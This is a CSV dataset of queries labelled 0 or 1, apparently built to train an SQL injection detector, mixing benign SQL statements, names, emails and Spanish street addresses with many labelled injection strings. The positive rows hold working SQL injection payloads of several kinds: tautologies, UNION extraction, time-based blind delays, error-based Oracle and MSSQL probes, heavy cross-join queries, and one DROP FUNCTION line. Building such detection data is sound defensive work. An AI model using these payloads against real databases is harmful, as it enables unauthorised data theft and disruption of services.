Query,Label
limitable,0
griffith_chesbro@psykoterapeut.sn,0
SELECT TOP 50 PERCENT * FROM ear SELECT * FROM fog FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tribe,0
salter@quiromante.com.mg,0
" SELECT * FROM being ORDER BY said ASC, coal DESC",0
1'  )   where 9817  =  9817,1
"1%""   )    )     )   union all select null,null--",1
SELECT * FROM mean WHERE market LIKE '%explore%',0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,1
"1""   )    )    as hbfi where 4773  =  4773 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
kindra,0
SELECT COUNT ( DISTINCT purple )  FROM even,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_2_link' LIMIT 1,0
1'  )   where 5145  =  5145,1
"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",1
"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
SELECT COUNT ( softID ) FROM top,0
"   SELECT Employees.poet, COUNT ( Orders.townID )  AS shallowFROM    ( OrdersINNER JOIN spent ON Orders.passageID  =  Employees.valuableID ) ",0
SELECT TOP 50 PERCENT * FROM cold SELECT * FROM particular FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM express,0
-2210' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'myvr' like 'myvr,1
"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
alfeiza,0
SELECT * FROM up WHERE influence = 'another',0
9.55464E+15,0
SELECT * FROM barn WHERE sheet NOT BETWEEN 'century' AND 'health',0
"admin""  )   or ""1""  =  ""1""#",1
"pl. comercial 54, 5d",0
"-4300""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""klbu""  =  ""klbu",1
"-9062"" or 6872  =  6872 and ""aumq"" like ""aumq",1
darnall,0
"  UPDATE putting SET charge =  'went', City =  'dozen' WHERE signal =  rate",0
"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
 (  select   (  case when   (  6714  =  8872  )   then 1 else 6714*  (  select 6714 from master..sysdatabases  )   end   )    ) ,1
3151,0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",1
SELECT * FROM statement WHERE worker  BETWEEN 10 AND 20,0
3748ny,0
"-4869%' union all select 5729,5729,5729--",1
acho queralt,0
select case when 6555  =  7349 then 1 else null end--,1
"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1'+  (  select nzij where 5456  =  5456 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",1
gaile,0
neusy,0
SELECT * FROM  ( SELECT motion FROM sum ) ,0
1  )   where 2083  =  2083,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 191 )  ORDER BY meta_id ASC",0
cenicientos,0
malacopterigio,0
estiradamente,0
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""umst""  =  ""umst",1
SELECT * FROM suddenly WHERE    NOT public = 'class',0
olmos de ojeda,0
yoselie,0
7.38083E+15,0
select   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"1""   )    )    as ccjk where 1932  =  1932 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM travel WHERE claws NOT LIKE 'escape%',0
pladeval berganciano,0
select case when 6229  =  2077 then 1 else null end--,1
SELECT slide ( s )  FROM see,0
"  SELECT DAYNAME ( ""2017-06-15"" ) ;",0
"1%""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
"1""  )   where 2312  =  2312 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
torrejn de ardoz,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239189 )  ORDER BY meta_id ASC",0
"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",1
"  SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID =  sometime.write ORDER BY crack.card",0
"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,1
59di51ca1,0
"-7036%' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",1
SELECT * FROM century ORDER BY tobacco DESC,0
SELECT * FROM breakfast WHERE simplest BETWEEN taste09/01/1996plastic AND event15/31/1996because,0
"c/ el columpio 13,",0
SELECT secret ( s FROM must RIGHT JOIN,0
SELECT * FROM hide WHERE    NOT animal = 'outside',0
SELECT * FROM upper WHERE strip NOT LIKE 'steady%',0
SELECT fix FROM air UNION ALL SELECT national FROM pale ORDER BY cat,0
sowry,0
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1
SELECT * FROM simple WHERE good NOT BETWEEN 'attempt' AND 'stems',0
"1 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
erhard@miplat.il,0
SELECT COUNT ( lakeID ) FROM point,0
or 3  =  3,1
SELECT * FROM corn WHERE offer = 'atom' FETCH FIRST 3 ROWS ONLY,0
"1%""   )    )    and 1083  =  6202",1
SELECT * FROM tried WHERE women = 'bag'  OR play = 'jack',0
3.32981E+15,0
"-2612""  )   as iwfj where 3231  =  3231 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
"calle fermin caballero, 103, 10h",0
SELECT MIN ( not )  AS compound FROM bar,0
SELECT smile FROM river,0
1084,0
1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,1
1'||  (  select 'dezl' where 8661  =  8661,1
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",1
SELECT introduced ( s )  FROM agree,0
babasaki,0
SELECT * FROM organized WHERE trunk  BETWEEN 10 AND 20,0
if  (  8727  =  4039  )   select 8727 else drop function giql--,1
"1""  )   where 2837  =  2837 and   (  3020  =  3020  )  *6703--",1
"   SELECT COUNT ( ran ) , monkey FROM operation BY cast",0
SELECT flag FROM directly UNION ALL SELECT combination FROM swim ORDER BY triangle,0
  )   or sleep  (  __TIME__  )    =  ',1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",1
SELECT citizen ( s )  FROM news SELECT distant FROM hall,0
"  SELECT * FROM brain WHERE cloud NOT IN  ( 'hardly', 'function', 'excellent' )  ",0
1'   )    )    as nhkp where 8030  =  8030,1
"c/jon habana, 111",0
select case when 3252  =  9622 then 1 else null end--,1
SELECT * FROM bound WHERE did BETWEEN 'began' AND 'inch',0
calle nicolas funes 116,0
maiga,0
-4785' or   (  8459  =  8459  )  *4906 and 'esfn'  =  'esfn,1
pensosa,0
"1%""  )   rlike sleep  (  5  )  #",1
SELECT TOP 3 * FROM jungle WHERE plan = 'stiff' SELECT * FROM positive,0
"1%""   )    )    union all select null,null,null,null,null,null,null,null--",1
"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM suggest FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM porch,0
calle tras do colexio s/n,0
SELECT TOP 3 * FROM know WHERE aloud = 'buffalo' SELECT * FROM hurt,0
"1%"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'  )   where 8125  =  8125 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1 where 8102  =  8102 and 9198  =  9198--,1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1
-9840'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dzlp'  =  'dzlp,1
c/ pirucha s/n 4-e,0
dyck,0
odelsia,0
SELECT TOP 3 * FROM particular WHERE rise = 'treated',0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # cdjm",1
-6217   )    )    as hyws where 3441  =  3441 or 9421  =  4695#,1
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1
SELECT part ( s )  FROM cannot LEFT JOIN,0
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'mseo' like 'mseo",1
37759460s,0
SELECT * FROM pride WHERE NOT directly = 'thousand'  AND NOT instant = 'spread',0
mosegui bofill,0
bevis,0
select case when 2599  =  7035 then 1 else null end--,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",1
"  SELECT * FROM change WHERE newspaper IN  ( 'caught', 'ahead', 'pie' )  ",0
"-2131"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""wpsf"" like ""wpsf",1
3.59196E+15,0
2.24329E+15,0
"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""jref"" like ""jref",1
"1%"" rlike sleep  (  5  )  #",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""%""  =  """,1
SELECT * FROM letter WHERE too BETWEEN 'slabs' AND 'ten',0
kaycee,0
SELECT * FROM wp_posts WHERE ID  =  367808 LIMIT 1,0
"dos aceras 119,",0
jaln de cameros,0
1'||  (  select 'rjis' from dual where 7696  =  7696 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',1
fresno de torote,0
-5356'  )   or 9323  =  9323#,1
SELECT COUNT ( ProductID ) FROM Products;,0
SELECT TOP 50 PERCENT * FROM substance SELECT * FROM result FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM blow,0
SELECT * FROM interest WHERE earth = 'mail'  OR aloud = 'beyond',0
SELECT LOWER ( CustomerName )  AS LowercaseCustomerName FROM Customers;,0
"1""  )   as axua where 6718  =  6718",1
in8ros742tiva,0
1'  )   where 3893  =  3893,1
"1'   )    )    as pstn where 6691  =  6691 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
SELECT sudden FROM cause UNION SELECT hospital FROM straw ORDER BY pleasure,0
select   (  case when   (  3365  =  6236  )   then 3365 else 1/  (  select 0  )   end  )  --,1
1   )    )    as kccx where 7547  =  7547 union all select null--,1
bnrinfo,0
SELECT teeth ( s ) FROM may INNER JOIN,0
SELECT * FROM variety WHERE gun = 'appropriate' LIMIT 3,0
bscones de ojeda,0
5718,0
SELECT brought FROM title UNION SELECT bigger FROM loose ORDER BY period,0
SELECT COUNT ( DISTINCT learn )  FROM customs,0
presencio,0
SELECT TOP 50 PERCENT * FROM pure,0
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
SELECT * FROM breathing FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM picture  WHERE second = above,0
-7941 or   (  5822  =  8754  )  *8754-- eepn,1
"calle santa teresa, 87 5?b",0
47651101t,0
SELECT TOP 50 PERCENT * FROM win SELECT * FROM stranger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stiff,0
SELECT AVG ( driven ) FROM length,0
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,1
1.93115E+15,0
76156835v,0
"1%""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,1
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
37170,0
"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",1
"  SELECT PERIOD_DIFF ( 201710, 201703 ) ;",0
rainmake,0
"  SELECT foodID AS ID, those AS distant FROM deer",0
1  )   where 9307  =  9307,1
" SELECT column_name ( s )  FROM share,sound",0
3.07402E+15,0
SELECT * FROM nature 3,0
1   )    )    as eveb where 7567  =  7567,1
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'uzmy' like 'uzmy,1
"1%'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",1
que3h5a,0
confirmar,0
"1""  )   as sraw where 1997  =  1997 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
1'  )   as ubvf where 5923  =  5923 and 8490  =  4925--,1
"c/ leopoldo alas ""clarin"" 4, 6?b",0
SELECT MIN ( height )  AS lost FROM fair,0
1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,1
SELECT * FROM farm,0
"select * from generate_series  (  3990,3990,case when   (  3990  =  9597  )   then 1 else 0 end  )   limit 1--",1
SELECT Count ( * )  AS noon,0
"1'   )    )    union all select null,null,null,null--",1
celio,0
moskuna@sitcpla.ye,0
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1
"1 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM eleven WHERE own = 'air'  AND  ( series = 'wheat' OR interior = 'bowl' ) ,0
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""%""  =  """,1
SELECT COUNT ( problemID ) FROM pound,0
"select * from generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   limit 1--",1
1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',1
SELECT * FROM position WHERE rich = 'balance' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM turn FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM stood,0
SELECT sale ( s )  FROM accident UNION ALL,0
SELECT * FROM she 3 SELECT * FROM further,0
"   SELECT managed,afternoon,particularly,primitive,stop     (  (  who JOIN follow ON length.sum =  variety.ocean )   INNER JOIN cryON Orders.cake =  cry.goldenID ) ",0
"plaa tarent, 117, 2-h",0
-9358' or 9887  =  2569--,1
02906029w,0
SELECT zulu ( s )  FROM worried SELECT history FROM crack,0
